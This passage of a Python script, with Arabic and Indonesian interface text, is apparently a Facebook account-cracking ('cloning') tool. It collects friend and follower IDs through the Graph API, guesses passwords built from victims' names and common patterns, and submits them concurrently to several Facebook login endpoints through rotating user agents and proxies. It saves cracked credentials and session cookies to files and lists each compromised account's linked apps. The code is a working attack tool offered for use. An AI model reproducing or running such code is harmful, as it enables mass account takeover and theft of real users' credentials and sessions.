		print('[✖] Your limit error')
		time.sleep(3)
		follower()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1		
		kl = input('[*] الايدي>> '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			koh2 = ses.get('https://graph.facebook.com/'+userr+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
			for pi in koh2['subscribers']['data']:
				try:id.append(pi['id']+'|'+pi['name'])
				except:continue
			print('[>>] Total Id : '+str(len(id)))
			setting()
		except requests.exceptions.ConnectionError:
			print('[✖] No Connection  ')
			exit()
		except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def TakeFile():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		
		jum = input('[?] INPUT FILE : ')
		for line in open(jum, 'r').readlines():
			id.append(line.strip())
		print('[•] Total Id : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
			print('[✘] No Connection  ')
			exit()
	except (KeyError,IOError):
			print('[✘] Id Is Not Public')
			time.sleep(3)
			follower()

def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> MANY ID : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> الايدي '+str(yz)+' : ')
		uid.append(kl)
	for user in uid:
	    try:
	       head = (
	       {"user-agent": "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.114 Safari/537.36"
	       })
	       if len(id) == 0:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	          
	       )
	       else:
	           params = (
	           {
	           'access_token': token,
	           'fields': "friends"
	           }	           
	       )
	       url = requests.get('https://graph.facebook.com/{}'.format(user),params=params,headers=head,cookies={'cookies':cok}).json()
	       for xr in url['friends']['data']:
	           try:
	               woy = (xr['id']+'|'+xr['name'])
	               if woy in id:pass
	               else:id.append(woy)
	           except:continue
	    except (KeyError,IOError):
	      pass
	    except requests.exceptions.ConnectionError:
	        exit()
	try:
		print('')
		print(f'>> ID : عدد الايديات{h}'+str(len(id)))
		time.sleep(3)
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('<•> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'<•>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------[ PENGATURAN-IDZ ]---------------#
def File2():
			print('')
			print('\x1b[1;92m             FILE CLONING')
			try:
				print('        - - - - - - - - - - - -')
				fileX = input (f' {P}[+] ENTER FILE PATH :\x1b[1;92m ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print('')
				print('\x1b[1;92mTOTAL ID :\x1b[1;91m '+str(len(id)))
				setting()
			except IOError:
				exit("\x1b[1;91m[!] FILE  %s NOT FOUND"%(fileX))
def setting():
	table=Table()
	table.add_column("МΑX", justify="center", width=11, style="red") 
	table.add_column("SΡЄⱰ", justify="center", width=36, style="red") 
	table.add_column("ΤΣ1", justify="center", width=20, style="red")
	table.add_row("01", "صيد قديم بس", " ضعيف صيد") 
	table.add_row("02","صيد جديد ","قليل يصيد ")
	table.add_row("03","صيد قديم +جديد ","صيد نار 🔥")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style="bold hot_pink2"))
	hu = Console().input(f'[bold red] ╰─ [bold white]chose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' ╰─  Choose the Right Opetion ')
		exit()
	table=Table()
	table.add_column("ΤΣ1",justify="center",width=11,style="red")
	table.add_column("SΡЄⱰ ",justify="center",width=36,style="red")
	table.add_column("МΑX",justify="center",width=20,style="red")
	table.add_row("01","اتصال رقم 1","شغال هذ")
	table.add_row("02","اتصال رقم 2","معطل تحت تحديث")
	table.add_row("03","اتصال رقم 3","معطل تحت تحديث")
	table.add_row("04","اتصال رقم 4","معطل تحت تحديث")
	cetak(nel(table,width=79,title=f"[bold red]METODE LOGIN",style="bold hot_pink2"))
	hc = input(f'{M} ╰─  {P}Pilih metode : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('mobilev2')
	elif hc in ['5','05']:
		method.append('lawakv1')
	elif hc in ['6','06']:
	    method.append('lawakv2')
	else:
		method.append('mobile')
#	print('')
#	_jembot_ = input('\r╰─  Tampilkan Aplikasi y/t : \x1b[1;93m ')
#	if _jembot_ in ['']:
#		print('{M} ╰─  Pilih Yang Bener ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
#	pwplus=input(f'\r╰─  {P}TAMBAHKAN SANDI MANUAL? Y/T : \x1b[1;93m ')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		pwku=input(f'\r╰─  {P}Masukkan Sandi : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
		
	cetak(panel(f'[bold white]تريد تضيف اتصالات يوزر اجينت ? Y/T',width=79,title=f"[bold green]Setting User-Agent",style="bold hot_pink2")) 
	uatambah = input(f'\r╰─  {P}عدادات يوزر اجينت(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['n','NO','no','N']:
		uman.append('y')
		bzer = input(f' ╰─  User-Agent input : \x1b[1;93m ')
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
	
	
from datetime import datetime    	
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	sayang=[]
	sayang.append(panel(f'[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style="bold hot_pink2")) 
	sayang.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style="bold hot_pink2"))
	wa.print(Columns(sayang))
	print(f'\n\t\t\t{P}ON/OF MODE MODE AIRPLAN {M}200 {P}IDZ')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:
						pwv.append(nmf)
						pwv.append('first last') 
						pwv.append('qwertyuiopasdfghjkl') 
						pwv.append('qwertyuiopasdfghjklzxcvbnm') 
						pwv.append('aaaassss') 
						pwv.append('10002000') 
						pwv.append('12345@@@@@')
						pwv.append('١٢٣٤٥٦')
						pwv.append('00998877')
						pwv.append('0099887766')
						pwv.append('zzxxccvv')
						pwv.append('qwerqwer')
						pwv.append('07800780')
						pwv.append('07700770')
						pwv.append('12341234@@')
						pwv.append('10203040')
						pwv.append('100020003000')
						pwv.append('1234@@@@')
						pwv.append('١١٢٢٣٣٤٤٥٥')
						pwv.append('qwertyuiop')
						pwv.append('1020304050')
						pwv.append('zzzzxxxx')
					
				else:

					if len(frs)<3:

						pwv.append(nmf)

						pwv.append(frs+frs)

					else:
						pwv.append(nmf)
						pwv.append('first last') 
						pwv.append('qwertyuiopasdfghjkl') 
						pwv.append('qwertyuiopasdfghjklzxcvbnm') 
						pwv.append('aaaassss') 
						pwv.append('10002000') 
						pwv.append('12345@@@@@')
						pwv.append('١٢٣٤٥٦')
						pwv.append('00998877')
						pwv.append('0099887766')
						pwv.append('zzxxccvv')
						pwv.append('qwerqwer')
						pwv.append('07800780')
						pwv.append('07700770')
						pwv.append('12341234@@')
						pwv.append('10203040')
						pwv.append('100020003000')
						pwv.append('1234@@@@')
						pwv.append('١١٢٢٣٣٤٤٥٥')
						pwv.append('qwertyuiop')
						pwv.append('1020304050')
						pwv.append('zzzzxxxx')
					
						
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mobilev2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'lawakv1' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'lawakv2' in method:
					pool.submit(cracklawakv2,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  crack done type [y] for crack again')
	print(f'  [{h}•{x}]{h} 𝒐𝒌_✅ : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} 𝑪𝒑_❌ : {k}%s{x} '%(cp))
	
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,9))
	android_version = str(random.randint(1,12))
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sambro} Chrome/{chrome_version} Mobile Safari/537.36'
	return ua
#--------------------[ METODE MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}@LPOK_HGSJ{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'ايميل ':idf,
'باسورد':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'd.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://d.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://d.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fd.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://d.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=data,headers=headers,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(f" ")
				tree.add(f"[ Checkpoint ]").add(f"[bold yellow]{idf}|{pw}|{thn}").add(f"[bold yellow]{ua}\n")
				cetak(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"SupportsFresco=1 Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J210F Build/MMB29Q) Source/1 [FBAN/EMA;UNITY_PACKAGE/342;FBBV/107586706;FBAV/172.0.0.8.182;FBDV/SM-J210F;FBLC/id_ID;FBOP/20]"}
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'|'+ua+'\n')
				user=idf
				infoakun = ""
				session = requests.Session()
				cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
				cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
				apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
				nok=1
				for muncul in apkaktif:
					infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
					nok+=1

				hit=0
				apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
				hit=0
				for muncul in apkexp:
					hit+=1
					infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}ايميل {P2}  : {H2}{idf}")
				tree.add(f"{P2}باسورد {P2} : {H2}{pw}")
				tree.add(f"{H3}{يوزراجينت}{P2}")
				tree.add(f"{H3}{كوكيز}{P2}")
				tree.add(f"{P2}تطبيقات {P2} :                                                  {H2}{infoakun}")
				tree.add(f"{P2}Time crack account {P2} : {H2}{thn}")
				cetak(tree)
				ok+=1
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(1)
	loop+=1
#--------------------[ METODE MOBILE V2 ]-----------------#
def crackmobilev2(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Validate M. facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/login.php?skip_api_login=1&api_key=113289095462482&kid_directed_site=0&app_id=113289095462482&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr","flow":"login_no_pin","pass":pw,}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D113289095462482%26scope%3Demail%252Cpublic_profile%26redirect_uri%3Dhttps%253A%252F%252Fzoom.us%252Ffacebook%252Foauth%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%26_x_zm_rtaid%3DcVJiy3uGSbSvWr-DDSZNng.1679058723947.4bc348f596f10457902323ef31509d67%26_x_zm_rhtaid%3D542%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D516d7f95-093f-4513-847e-788f90c4cbd5%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fzoom.us%2Ffacebook%2Foauth%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DR0dyYTRzQmhUUzJ4Zk9Xc1pFd3NOdyxmYWNlYm9va19zaWduaW4%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				tree = Tree(" ")
				#tree.add(f"[bold green]{tahun(idf)}")
				#cetak(panel(f"[bold yellow]Checkpoint-Login")
				tree.add(f"\r{P2}User ID {P2}     : {K2}{idf}")
				tree.add(f"\r{P2}Password {P2}    : {K2}{pw}")
				tree.add(f"{K2}{ua}{P2}")
				prints(tree)
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				tree = Tree(" ")
				#cetak(panel(f"[bold green]Succes-Login[bold grey]")
				tree.add(f"\r{P2}User ID {P2}  : {H2}{idf}")
				tree.add(f"{P2}Password {P2} : {H2}{pw}")
				tree.add(f"{H3}{ua}{P2}")
				cetak(tree)
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+ua+'\n')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#------------------[ METHODE MBASIC ]-------------------#
def crackmbasic(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}Asycn Mbasic.facebook{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			link = ses.get('https://m.facebook.com/login.php?skip_api_login=1&api_key=950160105669643&kid_directed_site=0&app_id=950160105669643&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv8.0%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D950160105669643%26scope%3Dpublic_profile%2Bemail%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%26redirect_uri%3Dhttps%253A%252F%252Fwww.nassfeld.at%252Fauth%252Foauth%252Fcheck%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Da3c9e2da-62f8-4d27-8613-adbf1a26e11c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.nassfeld.at%2Fauth%2Foauth%2Fcheck%2Ffacebook%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3DeyJjc3JmX3Rva2VuIjoiODZiZjM4MzFjMWE4NWYwNzhmZGUyZWY2ZDk4ZWNiMGUifQ%25253D%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),
'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),
'email': idf,
'prefill_contact_point': idf,
'prefill_source': 'browser_onload',
'prefill_type': 'contact_point',
'first_prefill_source': 'browser_dropdown',
'first_prefill_type': 'contact_point',
'had_cp_prefilled': 'true',
'had_password_prefilled': 'false',
'is_smart_lock': 'false',
'bi_xrwh': '0',
'encpass': '#PWD_BROWSER:0:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),pw),
'fb_dtsg': '',
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
